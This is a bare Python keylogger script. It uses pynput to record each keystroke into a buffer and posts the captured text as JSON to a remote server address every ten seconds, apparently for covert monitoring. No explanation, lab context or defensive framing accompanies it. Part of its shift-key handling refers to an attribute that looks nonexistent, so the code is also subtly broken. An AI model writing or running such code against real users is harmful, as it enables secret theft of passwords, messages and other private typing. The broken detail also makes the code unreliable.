from pynput import keyboard
import requests
import json
import threading

# Server ip addr and port number
ip_address = ""
port_number = ""

# Time interval in seconds
time_interval = 10

text = ""

def send_post_req():
    try:
        payload = json.dumps({"keyboardData" : text})
        r = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type" : "application/json"})
        timer = threading.Timer(time_interval, send_post_req)
        timer.start()
    except:
        print("Request Error!")

def on_press(key):
    global text

    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        if keyboard.Key.shift_pressed:
            text += str(key).strip("'").capitalize()
        else:
            text += str(key).strip("'")

with keyboard.Listener(
    on_press=on_press) as listener:
    send_post_req()
    listener.join()